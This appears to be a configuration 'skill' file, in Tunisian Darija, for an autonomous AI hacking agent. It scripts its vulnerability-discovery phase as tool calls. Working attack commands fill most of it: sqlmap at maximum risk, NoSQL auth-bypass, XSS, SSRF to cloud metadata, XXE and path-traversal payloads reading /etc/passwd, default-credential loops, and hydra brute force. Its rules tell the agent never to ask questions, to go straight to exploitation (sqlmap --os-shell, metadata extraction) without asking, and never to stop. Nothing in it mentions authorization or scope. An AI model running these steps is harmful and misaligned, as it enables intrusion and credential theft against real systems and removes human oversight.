---
name: e5tira9-discovery
description: "Vulnerability discovery otomatique — nikto, nuclei, sqlmap, XSS, SSRF, XXE, injection testing. Phase thenya fel e5tira9. Darija."
---

# E5tira9 Discovery — Vulnerability Discovery Autonome

Skill mte3 vulnerability discovery profonde. Bech tlawej 3la kol type mte3 vulnerability: SQLi, XSS, SSRF, XXE, NoSQLi, path traversal, etc.

## Qawa3d

1. MATSE2EL CHI HAJA
2. Kol action → `[FEED] HH:MM:SS | DISCOVERY | <action> | <result>`
3. Testi KOLLHOM — kol parameter, kol endpoint, kol header
4. Loota lqit vulnerability, wadeh m3a PoC w rawen lel EXPLOIT phase

## Workflow

### Step 1: Web Scanner — nikto
```
shannon_vuln_discovery command="nikto -h <target> -Format json"
[FEED] 14:50:00 | DISCOVERY | nikto scan | 8 issues found
```

### Step 2: Nuclei Templates — KOLLHOM
```
shannon_vuln_discovery command="nuclei -u <target> -t /root/nuclei-templates/ -severity critical,high,medium"
[FEED] 14:55:00 | DISCOVERY | nuclei scan | 3 critical, 5 high
```

### Step 3: SQL Injection — KOL parameters
```
# Test kol URL parameter
shannon_vuln_discovery command="sqlmap -u '<target>?id=1' --batch --level=5 --risk=3 --dbs"
shannon_vuln_discovery command="sqlmap -u '<target>?search=test' --batch --level=5 --risk=3 --dbs"

# Test POST body
shannon_vuln_discovery command="sqlmap -u '<target>/login' --data='username=admin&password=admin' --batch --level=5 --risk=3"

# Test cookies
shannon_vuln_discovery command="sqlmap -u '<target>' --cookie='session=abc123' --batch --level=5 --risk=3"
[FEED] 15:00:00 | DISCOVERY | sqlmap | SQL injection found in /api/users?id=
```

### Step 4: NoSQL Injection
```
shannon_exec command='curl -X POST <target>/api/login -H "Content-Type: application/json" -d "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}"'
shannon_exec command='curl -X POST <target>/api/users -H "Content-Type: application/json" -d "{\"id\":{\"$gt\":0},\"name\":{\"$regex\":\".*\"}}"'
[FEED] 15:05:00 | DISCOVERY | NoSQL injection | auth bypass possible
```

### Step 5: XSS Testing
```
# Reflected XSS — test kol parameters
shannon_exec command='curl -s "<target>/search?q=<img src=x onerror=alert(1)>" | grep -i "onerror"'
shannon_exec command='curl -s "<target>/search?q=<script>alert(1)</script>" | grep -i "script"'

# Stored XSS — registration forms
shannon_exec command='curl -X POST <target>/register -d "email=<iframe src=javascript:alert(1)>&password=test"'

# DOM XSS — needs browser
shannon_browser script="await page.goto('<target>/#/?q=<img src=x onerror=alert(1)>'); const content = await page.content(); if (content.includes('onerror')) console.log('VULN: DOM XSS')"
[FEED] 15:10:00 | DISCOVERY | XSS | reflected XSS in /search
```

### Step 6: SSRF Testing
```
shannon_exec command='curl -X PUT <target>/profile/image -H "Content-Type: application/json" -d "{\"url\":\"http://169.254.169.254/latest/meta-data/\"}"'
shannon_exec command='curl -X POST <target>/import -d "url=http://localhost:3000/api/admin"'
[FEED] 15:15:00 | DISCOVERY | SSRF | cloud metadata accessible
```

### Step 7: XXE Testing
```
shannon_upload_test target="<target>" payload="xxe"
shannon_exec command='curl -X POST <target>/upload -H "Content-Type: application/xml" -d "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>"'
[FEED] 15:20:00 | DISCOVERY | XXE | /etc/passwd readable
```

### Step 8: Path Traversal
```
shannon_exec command='curl -s "<target>/file?name=../../../etc/passwd"'
shannon_exec command='curl -s "<target>/download?path=....//....//....//etc/passwd"'
shannon_exec command='curl -s "<target>/page?file=..%252f..%252f..%252fetc%252fpasswd"'
[FEED] 15:25:00 | DISCOVERY | path traversal | /etc/passwd readable
```

### Step 9: Headers Audit
```
shannon_headers_audit target="<target>"
[FEED] 15:30:00 | DISCOVERY | headers audit | missing CSP, HSTS, X-Frame-Options
```

### Step 10: Parameter Fuzzing
```
shannon_param_fuzz target="<target>"
[FEED] 15:35:00 | DISCOVERY | param fuzz | hidden parameter 'admin' found
```

### Step 11: API Fuzzing
```
shannon_api_fuzzer target="<target>"
[FEED] 15:40:00 | DISCOVERY | API fuzz | GraphQL introspection enabled
```

### Step 12: Rate Limit Testing
```
shannon_rate_limit_test target="<target>/api/login" action="burst" requests=50 method="POST" body='{"email":"test","password":"wrong"}'
shannon_rate_limit_test target="<target>/api/login" action="timing" valid_input='{"email":"admin@target.com","password":"x"}' invalid_input='{"email":"nonexist@fake.com","password":"x"}'
[FEED] 15:45:00 | DISCOVERY | rate limit | no rate limiting on login
```

### Step 13: Default Credentials
```
shannon_exec command='for user in admin root test guest; do for pass in admin password 123456 admin123 root test guest password123; do code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST <target>/login -d "username=$user&password=$pass"); if [ "$code" = "200" ] || [ "$code" = "302" ]; then echo "FOUND: $user:$pass"; fi; done; done'
[FEED] 15:50:00 | DISCOVERY | default creds | admin:admin123 works
```

### Step 14: Brute Force
```
shannon_exec command="hydra -l admin -P /usr/share/wordlists/rockyou.txt <target> http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'"
[FEED] 15:55:00 | DISCOVERY | hydra brute force | password found: shadow123
```

## Loota ma tlqot chi Hajja

- Zid sqlmap level: `--level=5 --risk=3`
- Jarrab payloads mokhtelfin: tamper scripts `--tamper=space2comment`
- Zid nuclei templates: custom templates
- Jarrab HTTP methods mokhtelfin: PUT, DELETE, PATCH, TRACE
- Testi headers mokhtelfin: X-Forwarded-For, User-Agent, Referer
- Fuzz m3a ffuf 3la kol endpoints
- Jarrab encoding: double URL, base64, hex
- Testi bbywordlists kbar: `directory-list-2.3-medium.txt`

## Output

Loota lqit vulnerabilities → rawen lel EXPLOIT phase bela ma ts2el.
Ken lqit SQLi → sqlmap --os-shell
Ken lqit default creds → login w rawen lel IDOR
Ken lqit XSS → stored XSS payload
Ken lqit SSRF → cloud metadata extraction
Ken lqit path traversal → read sensitive files

MAT9AFCH — e5tira9 mch 5 dolar.
